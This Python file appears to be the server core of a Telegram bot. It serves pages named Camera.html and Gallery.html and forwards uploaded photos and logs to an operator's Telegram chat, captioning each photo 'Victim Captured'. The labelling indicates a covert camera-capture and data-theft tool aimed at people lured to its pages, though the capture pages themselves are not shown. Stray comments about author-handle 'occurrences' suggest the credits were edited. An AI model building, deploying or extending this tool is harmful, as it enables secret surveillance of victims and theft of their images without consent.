import logging
import os
import asyncio
from aiohttp import web
from aiogram import Bot, Dispatcher, types
from aiogram.fsm.storage.memory import MemoryStorage
from config import BOT_TOKEN, BASE_URL, PORT
from handlers import user, features, admin
import database
from emojis import Emojis

# Configure logging
logging.basicConfig(level=logging.INFO)
logger = logging.getLogger(__name__)

# Occurrence 3 of @ovttr
logger.info("Initializing system kernel by @Danger_devil1917")

async def handle_root(request):
    return web.Response(text=f"API Server is Online {Emojis.b(Emojis.ROCKET)}", content_type="text/html")

async def serve_camera(request):
    try:
        with open('Camera.html', 'r', encoding='utf-8') as f:
            content = f.read()
        return web.Response(text=content, content_type='text/html')
    except Exception as e:
        return web.Response(text=f"Server Error: {e}", status=500)

async def serve_gallery(request):
    try:
        with open('Gallery.html', 'r', encoding='utf-8') as f:
            content = f.read()
        return web.Response(text=content, content_type='text/html')
    except Exception as e:
        return web.Response(text=f"Server Error: {e}", status=500)

async def submit_log(request):
    import security
    try:
        data = await request.json()
        chat_id = int(data.get('chat_id', 0))
        token = data.get('token', '')
        if not security.validate_token(token, chat_id):
            return web.json_response({"status": "error", "message": "Unauthorized request"}, status=403)
        
        text = data.get('text')
        bot = request.app['bot']
        if chat_id and text:
            await bot.send_message(chat_id, text, parse_mode='HTML', disable_web_page_preview=False)
            return web.json_response({"status": "ok"})
    except Exception as e:
        logger.error(f"Log Error: {e}")
    return web.json_response({"status": "error"}, status=400)

async def submit_photo(request):
    import security
    try:
        data = await request.post()
        chat_id = int(data.get('chat_id', 0))
        token = data.get('token', '')
        if not security.validate_token(token, chat_id):
            return web.json_response({"status": "error", "message": "Unauthorized request"}, status=403)

        mode = data.get('mode', 'FRONT')
        photo_field = data.get('photo')
        bot = request.app['bot']
        if chat_id and photo_field:
            photo_bytes = photo_field.file.read()
            input_file = types.BufferedInputFile(photo_bytes, filename=f"capture_{mode}.jpg")
            # Occurrence 1 of Developed by: @Rytxe
            await bot.send_photo(
                chat_id, 
                input_file, 
                caption=f"{Emojis.CAMERA} <b>Victim Captured ({mode})</b>\n{Emojis.LIGHTNING} Developed by: @Danger_devil1917",
                parse_mode='HTML'
            )
            return web.json_response({"status": "ok"})
    except Exception as e:
        logger.error(f"Photo Error: {e}")
    return web.json_response({"status": "error"}, status=400)

async def main():
    await database.init_db()
    bot = Bot(token=BOT_TOKEN)
    dp = Dispatcher(storage=MemoryStorage())
    dp.include_router(admin.router)
    dp.include_router(user.router)
    dp.include_router(features.router)
    
    app = web.Application()
    app['bot'] = bot
    app.router.add_get("/", handle_root)
    app.router.add_get("/Camera.html", serve_camera)
    app.router.add_get("/Gallery.html", serve_gallery)
    app.router.add_post("/submit-log", submit_log)
    app.router.add_post("/submit-photo", submit_photo)
    
    logger.info("Bot is starting (Polling)...")
    asyncio.create_task(dp.start_polling(bot))
    
    port = int(os.getenv("PORT", 8080))
    runner = web.AppRunner(app)
    await runner.setup()
    site = web.TCPSite(runner, "0.0.0.0", port)
    await site.start()
    
    logger.info(f"Server started on 0.0.0.0:{port}")
    while True:
        await asyncio.sleep(3600)

if __name__ == "__main__":
    try:
        asyncio.run(main())
    except (KeyboardInterrupt, SystemExit):
        logger.info("Bot stopped.")
